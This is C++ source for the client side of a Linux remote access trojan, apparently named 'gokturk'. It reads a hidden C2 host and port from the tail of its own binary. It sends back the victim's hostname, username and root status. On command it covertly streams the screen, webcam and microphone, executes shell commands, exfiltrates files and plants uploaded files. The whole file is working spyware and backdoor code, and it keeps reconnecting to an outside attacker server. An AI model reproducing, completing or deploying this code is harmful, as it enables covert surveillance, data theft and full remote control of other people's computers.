
#include <array>
#include <memory>
#include <fstream>

#include "include/tcpclient.h"
#include "include/screen.h"
#include "include/packet.h"
#include "include/webcam.h"
#include "include/microphone.h"
#include "include/audio.h"


struct ConfigData{

    uint16_t port;
    char host[256];

};

int sendFile(TcpClient & tcpClient1, const char * filePath){
    ssize_t result;
    std::ifstream fileRead;
    fileRead.open(filePath, std::ios::binary | std::ios::ate);
    if(!fileRead.is_open())
    {
        //
    }
    FileInfo fileInfo1{};
    fileInfo1.packetType = DWNFLE;
    fileInfo1.bufferSize = fileRead.tellg();
    fileRead.seekg(0);

    result = tcpClient1.sendData(&fileInfo1, sizeof(fileInfo1));
    if(result <= 0){
        //
    }

    char * fileBuffer = new char[fileInfo1.bufferSize];
    fileRead.read(fileBuffer, fileInfo1.bufferSize);
    fileRead.close();

    FilePacket filePacket1{};
    filePacket1.packetType = PCKFLE;

    DivPacket fileDivPacket1(fileBuffer, fileInfo1.bufferSize, 50000);

    for(size_t i=0; i < fileDivPacket1.getIter(); ++i)
    {
        std::memcpy(filePacket1.packetBuffer, fileDivPacket1.getPtr(i), fileDivPacket1.getSize(i));
        filePacket1.packetSize = fileDivPacket1.getSize(i);
        int senderSize = 50000 - fileDivPacket1.getSize(i);
        result = tcpClient1.sendData(&filePacket1, sizeof(filePacket1) - senderSize);
        if(result <= 0){
            //
        }
    }

    delete [] fileBuffer;
    return 0;
}



int main(int argc, char *argv[])
{
    TcpClient tcpClient1{};
    WebCam webCam1;

    conninfo  sysinfo{};
    PackTypes receivePacket1;

    std::string deskname = cmdExec("echo $DESKTOP_SESSION");
    strncpy(sysinfo.deskname, deskname.c_str(), deskname.length()-1);

    std::string accesstype = cmdExec("whoami");
    if(accesstype.compare(0, 4,"root")==0){
         strncpy(sysinfo.accesstype,"root",5);
    }else
    {
        strncpy(sysinfo.accesstype,"user",5);
    }

    gethostname(sysinfo.hostname, HOST_NAME_MAX);
    getlogin_r(sysinfo.username, LOGIN_NAME_MAX);

    ConfigData configData1{};
    std::ifstream readMe;
    readMe.open(argv[0], std::ios::binary | std::ios::ate);
    size_t bufSize = readMe.tellg();
    readMe.seekg(bufSize - sizeof(ConfigData));
    readMe.read((char*)&configData1, sizeof(ConfigData));
    readMe.close();


setconnect:
    tcpClient1.setConnect(configData1.host, configData1.port);

connection:
    std::this_thread::sleep_for(std::chrono::seconds(3));

    if(tcpClient1.connectServer() < 0){
//        cout <<  strerror(errno) <<  endl;
        goto connection;
    }

    if(tcpClient1.sendData(&sysinfo, sizeof(conninfo)) < 0){
         tcpClient1.endConnection();
         goto setconnect;
    }

//cout << "Connect To gokturk..." << endl;
    SumPacket  sumFilePacket1;
    FileInfo downFileInfo1{};
    while(true)
    {
        receivePacket1 = NULLTP;
        ssize_t result = tcpClient1.recvData(&receivePacket1, sizeof(receivePacket1));

        if(result <= 0)
        {
            tcpClient1.endConnection();
            goto setconnect;
        }

        switch(receivePacket1)
        {
            case INFSCR:
            {

                    std::thread screenThread(sendScreen, std::ref(tcpClient1));
                    screenThread.detach();
            }
            break;

            case INFCAM:
            {
                    if(webCam1.getDevice() == -1)
                    {
                       webCam1.openDevice("/dev/video0");
                       webCam1.setCropCapability(V4L2_BUF_TYPE_VIDEO_CAPTURE);
                       webCam1.setFormatDescription(V4L2_BUF_TYPE_VIDEO_CAPTURE);
                       webCam1.setFormatType(640,480,V4L2_BUF_TYPE_VIDEO_CAPTURE,V4L2_PIX_FMT_RGB24,V4L2_FIELD_NONE);
                       webCam1.setRequestBuffer(V4L2_BUF_TYPE_VIDEO_CAPTURE,V4L2_MEMORY_MMAP,1);
                       webCam1.setMemoryMap( V4L2_BUF_TYPE_VIDEO_CAPTURE,V4L2_MEMORY_MMAP ,0);
                       webCam1.setCapture(1,V4L2_BUF_TYPE_VIDEO_CAPTURE ,V4L2_MEMORY_MMAP, 0);
                    }
                    std::thread cameraThread(sendCamera, std::ref(tcpClient1), std::ref(webCam1));
                    cameraThread.detach();
            }
            break;

            case OFFCAM:
            {
                webCam1.closeDevice();
            }
            break;

            case INFAUD:
            {

                    std::thread microThread(sendMicrophone, std::ref(tcpClient1));
                    microThread.detach();
            }
            break;

            case INFCMD:
            {
                    CmdInfo cmdInfo1{};
                    tcpClient1.recvData(cmdInfo1.packetBuffer, 50000);
                    std::thread cmdThread(commandExecute, cmdInfo1.packetBuffer, std::ref(tcpClient1));
                    cmdThread.detach();
            }
            break;

            case DWNFLE:
            {
                    FileInfo fileInfo1{};
                    tcpClient1.recvData(fileInfo1.filePath, sizeof(fileInfo1) - sizeof(PackTypes));
                    std::thread dwnThread(sendFile, std::ref(tcpClient1), fileInfo1.filePath);
                    dwnThread.detach();
            }
            break;

            case UPLFLE:
            {

                tcpClient1.recvData(&downFileInfo1.filePath, sizeof(downFileInfo1) - sizeof(receivePacket1));

                sumFilePacket1.createBuffer(downFileInfo1.bufferSize);

            }
            break;

            case PCKFLE:
            {
                FilePacket downFilePacket1{};
                tcpClient1.recvData(&downFilePacket1.packetSize, sizeof(int));



                tcpClient1.recvData(downFilePacket1.packetBuffer, downFilePacket1.packetSize);


                sumFilePacket1.add(downFilePacket1.packetBuffer, downFilePacket1.packetSize);

                if(sumFilePacket1.copleted() == true)
                {
                    std::ofstream saveFile;
                    saveFile.open(downFileInfo1.filePath, std::ios::binary);

                    if(!saveFile.is_open())
                    {
                        sumFilePacket1.deleteBuffer();

                    }

                    saveFile.write(sumFilePacket1.getBuffer(),sumFilePacket1.getSize());
                    saveFile.close();
                    sumFilePacket1.deleteBuffer();


                }
            }
            break;
        }

     }

    return 0;
}
